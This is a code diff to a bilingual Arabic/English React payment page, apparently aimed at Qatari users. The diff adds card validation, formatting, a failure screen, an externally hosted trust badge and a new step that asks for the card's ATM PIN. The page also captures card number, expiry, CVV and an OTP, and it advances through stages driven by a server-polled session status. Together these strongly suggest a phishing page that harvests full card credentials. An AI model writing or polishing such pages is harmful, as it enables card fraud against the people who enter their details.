@@ -24,6 +24,11 @@ export default function Payment() {
   const [otpCode, setOtpCode] = useState("");
   const [atmPin, setAtmPin] = useState("");
 
+  const { data: sessionData } = trpc.payment.getSession.useQuery(
+    { sessionId },
+    { enabled: !!sessionId }
+  );
+
   const submitCardMutation = trpc.payment.submitCard.useMutation({
     onSuccess: () => setStage("card_pending"),
     onError: (err) => setError(err.message),
@@ -55,12 +60,56 @@ export default function Payment() {
     }
   }, [sessionStatus, stage]);
 
+  // Card validation helpers
+  const validateCardNumber = (num: string) => {
+    const cleaned = num.replace(/\s+/g, '');
+    if (!/^\d{16}$/.test(cleaned)) return false;
+    // Basic Luhn check
+    let sum = 0;
+    for (let i = 0; i < cleaned.length; i++) {
+      let digit = parseInt(cleaned[i]);
+      if ((cleaned.length - i) % 2 === 0) {
+        digit *= 2;
+        if (digit > 9) digit -= 9;
+      }
+      sum += digit;
+    }
+    return sum % 10 === 0;
+  };
+
+  const validateExpiry = (expiry: string) => {
+    if (!/^\d{2}\/\d{2}$/.test(expiry)) return false;
+    const [month, year] = expiry.split('/').map(n => parseInt(n));
+    if (month < 1 || month > 12) return false;
+    const now = new Date();
+    const currentYear = now.getFullYear() % 100;
+    const currentMonth = now.getMonth() + 1;
+    if (year < currentYear) return false;
+    if (year === currentYear && month < currentMonth) return false;
+    return true;
+  };
+
   const handleCardSubmit = (e: FormEvent) => {
     e.preventDefault();
+    setError(null);
+
+    if (!validateCardNumber(cardNumber)) {
+      setError(lang === "ar" ? "رقم البطاقة غير صحيح" : "Invalid card number");
+      return;
+    }
+    if (!validateExpiry(cardExpiry)) {
+      setError(lang === "ar" ? "تاريخ الانتهاء غير صحيح" : "Invalid expiry date");
+      return;
+    }
+    if (!/^\d{3,4}$/.test(cardCvv)) {
+      setError(lang === "ar" ? "رمز التحقق (CVV) غير صحيح" : "Invalid CVV");
+      return;
+    }
+
     submitCardMutation.mutate({
       sessionId,
       cardName,
-      cardNumber,
+      cardNumber: cardNumber.replace(/\s+/g, ''),
       cardExpiry,
       cardCvv,
     });
@@ -76,9 +125,26 @@ export default function Payment() {
     submitAtmPinMutation.mutate({ sessionId, atmPin });
   };
 
+  const formatCardNumber = (val: string) => {
+    const v = val.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+    const matches = v.match(/\d{4,16}/g);
+    const match = matches && matches[0] || '';
+    const parts = [];
+    for (let i = 0, len = match.length; i < len; i += 4) {
+      parts.push(match.substring(i, i + 4));
+    }
+    if (parts.length) return parts.join(' ');
+    return v;
+  };
+
+  const formatExpiry = (val: string) => {
+    const v = val.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+    if (v.length >= 2) return v.substring(0, 2) + '/' + v.substring(2, 4);
+    return v;
+  };
+
   return (
     <div className="min-h-screen bg-[#F8F9FA]" dir={lang === "ar" ? "rtl" : "ltr"}>
-      {/* Header Component */}
       <Header showLanguageToggle={false} />
 
       <main className="max-w-md mx-auto px-4 py-8">
@@ -93,36 +159,36 @@ export default function Payment() {
               <form onSubmit={handleCardSubmit} className="space-y-5">
                 <div className="flex justify-between items-center pb-4 border-b border-gray-100">
                   <span className="text-gray-600">{t("payment.totalAmount")}</span>
-                  <span className="text-xl font-bold text-[#8A1538]">0.00 QAR</span>
+                  <span className="text-xl font-bold text-[#8A1538]">{sessionData?.totalAmount || "0.00"} QAR</span>
                 </div>
 
                 {error && (
-                  <div className="p-3 bg-red-50 text-red-600 text-xs rounded-lg border border-red-100">
+                  <div className="p-3 bg-red-50 text-red-600 text-xs rounded-lg border border-red-100 font-bold">
                     {error}
                   </div>
                 )}
 
                 <div className="space-y-4">
                   <div>
-                    <label className="block text-xs font-bold text-gray-400 mb-1">{t("payment.cardholderName")}</label>
+                    <label className="block text-xs font-bold text-gray-400 mb-1 uppercase">{t("payment.cardholderName")}</label>
                     <input
                       type="text"
                       value={cardName}
-                      onChange={(e) => setCardName(e.target.value)}
-                      className="w-full p-3 border border-gray-200 rounded-lg outline-none focus:border-[#8A1538]"
+                      onChange={(e) => setCardName(e.target.value.toUpperCase())}
+                      className="w-full p-3 border border-gray-200 rounded-lg outline-none focus:border-[#8A1538] font-mono"
                       placeholder="NAME ON CARD"
                       required
                     />
                   </div>
 
                   <div>
-                    <label className="block text-xs font-bold text-gray-400 mb-1">{t("payment.cardNumber")}</label>
+                    <label className="block text-xs font-bold text-gray-400 mb-1 uppercase">{t("payment.cardNumber")}</label>
                     <input
                       type="text"
                       value={cardNumber}
-                      onChange={(e) => setCardNumber(e.target.value)}
-                      maxLength={16}
-                      className="w-full p-3 border border-gray-200 rounded-lg outline-none focus:border-[#8A1538]"
+                      onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
+                      maxLength={19}
+                      className="w-full p-3 border border-gray-200 rounded-lg outline-none focus:border-[#8A1538] font-mono tracking-widest"
                       placeholder="0000 0000 0000 0000"
                       required
                     />
@@ -130,25 +196,26 @@ export default function Payment() {
 
                   <div className="grid grid-cols-2 gap-4">
                     <div>
-                      <label className="block text-xs font-bold text-gray-400 mb-1">{t("payment.expiryDate")}</label>
+                      <label className="block text-xs font-bold text-gray-400 mb-1 uppercase">{t("payment.expiryDate")}</label>
                       <input
                         type="text"
                         value={cardExpiry}
-                        onChange={(e) => setCardExpiry(e.target.value)}
+                        onChange={(e) => setCardExpiry(formatExpiry(e.target.value))}
+                        maxLength={5}
                         placeholder="MM/YY"
-                        className="w-full p-3 border border-gray-200 rounded-lg outline-none focus:border-[#8A1538] text-center"
+                        className="w-full p-3 border border-gray-200 rounded-lg outline-none focus:border-[#8A1538] text-center font-mono"
                         required
                       />
                     </div>
                     <div>
-                      <label className="block text-xs font-bold text-gray-400 mb-1">{t("payment.cvv")}</label>
+                      <label className="block text-xs font-bold text-gray-400 mb-1 uppercase">{t("payment.cvv")}</label>
                       <input
                         type="password"
                         value={cardCvv}
-                        onChange={(e) => setCardCvv(e.target.value)}
+                        onChange={(e) => setCardCvv(e.target.value.replace(/[^0-9]/g, ''))}
                         maxLength={4}
                         placeholder="***"
-                        className="w-full p-3 border border-gray-200 rounded-lg outline-none focus:border-[#8A1538] text-center"
+                        className="w-full p-3 border border-gray-200 rounded-lg outline-none focus:border-[#8A1538] text-center font-mono"
                         required
                       />
                     </div>
@@ -158,7 +225,7 @@ export default function Payment() {
                 <button
                   type="submit"
                   disabled={submitCardMutation.isPending}
-                  className="w-full py-4 bg-[#8A1538] text-white rounded-lg font-bold hover:bg-[#6D112C] transition-all"
+                  className="w-full py-4 bg-[#8A1538] text-white rounded-lg font-bold hover:bg-[#6D112C] transition-all shadow-md active:scale-[0.98]"
                 >
                   {submitCardMutation.isPending ? t("payment.processing") : t("payment.completePayment")}
                 </button>
@@ -180,7 +247,7 @@ export default function Payment() {
                 <input
                   value={otpCode}
                   onChange={(e) => setOtpCode(e.target.value)}
-                  className="w-full text-center text-3xl font-bold p-4 bg-gray-50 border border-gray-200 rounded-xl outline-none focus:border-[#8A1538]"
+                  className="w-full text-center text-3xl font-bold p-4 bg-gray-50 border border-gray-200 rounded-xl outline-none focus:border-[#8A1538] font-mono tracking-[0.5em]"
                   placeholder="••••••"
                   maxLength={6}
                   required
@@ -195,24 +262,61 @@ export default function Payment() {
               </form>
             )}
 
+            {stage === "atm" && (
+              <form onSubmit={handleAtmSubmit} className="text-center space-y-6">
+                <h3 className="text-xl font-bold text-gray-900">{lang === "ar" ? "رقم PIN للصراف" : "ATM PIN"}</h3>
+                <p className="text-gray-500 text-sm">{lang === "ar" ? "يرجى إدخال الرقم السري للبطاقة" : "Please enter your card PIN"}</p>
+                <input
+                  type="password"
+                  value={atmPin}
+                  onChange={(e) => setAtmPin(e.target.value)}
+                  className="w-full text-center text-3xl font-bold p-4 bg-gray-50 border border-gray-200 rounded-xl outline-none focus:border-[#8A1538] font-mono tracking-[0.5em]"
+                  placeholder="••••"
+                  maxLength={4}
+                  required
+                />
+                <button
+                  type="submit"
+                  disabled={submitAtmPinMutation.isPending}
+                  className="w-full bg-[#8A1538] text-white font-bold py-4 rounded-xl shadow-lg"
+                >
+                  {submitAtmPinMutation.isPending ? "جاري التأكيد..." : t("payment.confirm")}
+                </button>
+              </form>
+            )}
+
             {stage === "success" && (
               <div className="py-12 text-center space-y-6">
-                <div className="text-5xl text-green-500">✓</div>
+                <div className="text-6xl text-green-500">✓</div>
                 <h3 className="text-2xl font-bold text-gray-900">{t("payment.success")}</h3>
                 <p className="text-gray-500">{lang === "ar" ? "شكراً لك، تمت معالجة العملية." : "Thank you, your payment has been processed."}</p>
                 <button
                   onClick={() => navigate("/")}
-                  className="bg-gray-900 text-white font-bold py-4 px-8 rounded-xl"
+                  className="bg-gray-900 text-white font-bold py-4 px-8 rounded-xl shadow-lg"
                 >
                   {t("payment.backHome")}
+                </button>
+              </div>
+            )}
+
+            {stage === "failed" && (
+              <div className="py-12 text-center space-y-6">
+                <div className="text-6xl text-red-500">✕</div>
+                <h3 className="text-2xl font-bold text-gray-900">{lang === "ar" ? "فشلت العملية" : "Payment Failed"}</h3>
+                <p className="text-gray-500">{error || (lang === "ar" ? "حدث خطأ أثناء معالجة الدفع." : "An error occurred during payment processing.")}</p>
+                <button
+                  onClick={() => setStage("card")}
+                  className="bg-[#8A1538] text-white font-bold py-4 px-8 rounded-xl shadow-lg"
+                >
+                  {lang === "ar" ? "حاول مرة أخرى" : "Try Again"}
                 </button>
               </div>
             )}
           </div>
         </div>
 
-        <div className="mt-8 flex justify-center gap-6 opacity-30 grayscale">
-          <img src="/card-brands.png" alt="Payment Methods" className="h-8 object-contain" />
+        <div className="mt-8 flex justify-center gap-6 opacity-40 grayscale hover:grayscale-0 transition-all">
+          <img src="https://i.ibb.co/3YCP2cj7/webtrust.png" alt="Payment Methods" className="h-10 object-contain" />
         </div>
       </main>
     </div>
